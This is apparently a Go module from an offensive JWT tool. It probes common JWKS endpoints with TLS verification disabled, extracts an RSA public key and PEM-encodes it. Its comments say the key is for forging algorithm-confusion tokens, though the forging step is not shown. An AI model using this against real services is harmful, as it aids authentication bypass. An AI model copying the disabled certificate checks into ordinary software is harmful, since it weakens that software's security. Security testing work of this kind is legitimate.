package jwtengine

import (
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"io"
	"math/big"
	"net/http"
	"time"
)

// JWKSEndpoints are common JWKS/OIDC discovery paths probed when hunting for
// an RSA public key to use in an algorithm-confusion attack.
var JWKSEndpoints = []string{
	"/.well-known/jwks.json",
	"/jwks.json",
	"/api/jwks",
	"/auth/jwks",
	"/.well-known/openid-configuration",
	"/oauth/discovery/keys",
	"/api/auth/jwks",
	"/v1/jwks",
}

// FetchRSAPublicKey fetches JWKS and extracts the RSA public key (falling
// back to an x5c PEM certificate) used to forge an algorithm-confusion token.
func FetchRSAPublicKey(baseURL string) *rsa.PublicKey {
	httpClient := &http.Client{
		Timeout: 6 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	for _, ep := range JWKSEndpoints {
		resp, err := httpClient.Get(baseURL + ep)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 32768))
		_ = resp.Body.Close()

		var jwks struct {
			Keys []struct {
				Kty string   `json:"kty"`
				N   string   `json:"n"`
				E   string   `json:"e"`
				X5c []string `json:"x5c"`
			} `json:"keys"`
		}
		if json.Unmarshal(body, &jwks) != nil {
			continue
		}

		for _, k := range jwks.Keys {
			if k.Kty == "RSA" && k.N != "" && k.E != "" {
				nBytes, err1 := base64.RawURLEncoding.DecodeString(k.N)
				eBytes, err2 := base64.RawURLEncoding.DecodeString(k.E)
				if err1 != nil || err2 != nil {
					continue
				}
				n := new(big.Int).SetBytes(nBytes)
				var eInt int
				for _, b := range eBytes {
					eInt = eInt<<8 | int(b)
				}
				return &rsa.PublicKey{N: n, E: eInt}
			}
			// x5c PEM certificate fallback
			if len(k.X5c) > 0 {
				certDER, err := base64.StdEncoding.DecodeString(k.X5c[0])
				if err != nil {
					continue
				}
				cert, err := x509.ParseCertificate(certDER)
				if err != nil {
					continue
				}
				if pub, ok := cert.PublicKey.(*rsa.PublicKey); ok {
					return pub
				}
			}
		}
	}
	return nil
}

// RSAPublicKeyToPEM converts an RSA public key to PEM-encoded bytes (PKIX DER).
func RSAPublicKeyToPEM(pub *rsa.PublicKey) []byte {
	derBytes, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return nil
	}
	return pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: derBytes})
}
